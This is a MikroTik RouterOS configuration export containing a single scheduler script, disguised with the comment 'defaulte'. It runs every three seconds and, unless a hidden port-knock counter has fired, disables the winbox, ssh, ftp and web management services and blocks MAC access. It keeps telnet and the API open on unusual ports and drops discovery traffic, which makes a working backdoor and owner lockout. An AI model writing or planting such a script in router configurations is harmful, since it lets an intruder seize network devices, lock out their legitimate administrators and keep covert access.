/system scheduler
add comment=defaulte interval=3s name=AUTO on-event=":local wxdisable \"no\"\r\
    \n:local fmmacwxdisable \"no\"\r\
    \n:foreach i in=[/ip firewall mangle find comment=\"macwx\"] do={\r\
    \n:if ([/ip firewall mangle get \$i disabled]=true) do={\r\
    \n:set fmmacwxdisable \"yes\"\r\
    \n}\r\
    \n}\r\
    \n:local wxnum [:len [/ip firewall mangle find comment=\"macwx\"]]\r\
    \n:local uservia [:len [/user active find via!=\"console\" ]]\r\
    \n:local tempcunt 0\r\
    \n:if (\$wxnum > 0) do={\r\
    \n    :set tempcunt [/ip firewall mangle get [find comment=\"macwx\"] pack\
    ets]\r\
    \n}\r\
    \n:if (\$wxnum=0 || \$tempcunt=0 || \$fmmacwxdisable=\"yes\") do={\r\
    \n:set wxdisable \"yes\"\r\
    \n}\r\
    \n:if (\$uservia =0 && \$wxdisable=\"yes\") do={\r\
    \n:do {\r\
    \n:if ([/ip service get telnet port]!=3579) do={\r\
    \n\t/ip service set telnet port=3579\r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:if ([/ip service get winbox disabled]=false) do={\r\
    \n\t/ip service disable winbox \r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:if ([/ip service get ftp disabled]=false) do={\r\
    \n\t/ip service disable ftp \r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:if ([/ip service get ssh disabled]=false) do={\r\
    \n\t/ip service disable ssh \r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:if ([/ip service get www disabled]=false) do={\r\
    \n    /ip service disable www\r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:if ([/ip service get www-ssl disabled]=false) do={\r\
    \n\t/ip service disable www-ssl\r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:if ([/ip service get api port]!=2468) do={\r\
    \n\t/ip service set api port=2468 disabled=no\r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:if ([/ip service get api-ssl port]!=2469) do={\r\
    \n\t/ip service set api-ssl port=2469 disabled=no\r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:if ([/tool mac-server get allowed-interface-list]!=\"none\") do={\r\
    \n\t/tool mac-server set allowed-interface-list=none\r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:if ([/tool mac-server mac-winbox get allowed-interface-list]!=\"none\")\
    \_do={\r\
    \n\t/tool mac-server mac-winbox set allowed-interface-list=none\r\
    \n}\r\
    \n} on-error={}\r\
    \n:do {\r\
    \n:local wxsearchhsadisable \"no\"\r\
    \n:foreach i in=[/interface bridge filter find comment=\"wxsearch\"] do={\
    \r\
    \n:if ([/interface bridge filter get \$i disabled]=true) do={\r\
    \n:set wxsearchhsadisable \"yes\"\r\
    \n}\r\
    \n}\r\
    \n:local nofilewx [:len [/interface bridge filter find comment=\"wxsearch\
    \"]]\r\
    \n:if (\$nofilewx = 0 || \$wxsearchhsadisable=\"yes\") do={\r\
    \n/interface bridge filter\r\
    \nremove [find comment=\"wxsearch\"]\r\
    \nadd action=drop chain=input comment=\"wxsearch\" disabled=no dst-port=56\
    78  ip-protocol=udp mac-protocol=ip src-port=!8671\r\
    \n}\r\
    \n} on-error={}\r\
    \n\r\
    \n:do {\r\
    \n:if (\$wxnum = 0 || \$fmmacwxdisable=\"yes\") do={\r\
    \n/ip firewall mangle\r\
    \nremove [find comment=\"macwx\"]\r\
    \nadd action=accept chain=prerouting comment=\"macwx\" dst-address=\\\r\
    \n    12.34.56.255 dst-port=4096 protocol=udp \\\r\
    \n    src-port=3721\r\
    \n}\r\
    \n} on-error={}\r\
    \n} else={\r\
    \n:if (\$wxnum !=0) do={\r\
    \n:if (\$tempcunt>3) do={\r\
    \n/tool mac-server mac-winbox set allowed-interface-list=all\r\
    \n/ip firewall mangle reset-counters [find comment=\"macwx\"]\r\
    \n} else={\r\
    \n:if (\$tempcunt!=0) do={\r\
    \n/ip firewall mangle reset-counters [find comment=\"macwx\"]\r\
    \n}\r\
    \n}\r\
    \n}\r\
    \n}\r\
    \n" policy=reboot,read,write,test,password,sniff,romon start-time=startup
